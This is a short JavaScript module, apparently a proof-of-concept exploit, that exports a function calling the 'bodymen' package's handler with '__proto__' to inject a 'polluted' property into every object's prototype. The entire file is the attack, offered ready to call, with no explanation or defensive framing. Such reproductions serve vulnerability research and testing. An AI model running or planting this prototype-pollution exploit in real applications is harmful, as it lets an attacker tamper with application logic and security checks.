function exploitFunction(payload) {
    const x = require("bodymen");
    x.handler("__proto__", "polluted", "yes");
}

module.exports = { exploitFunction };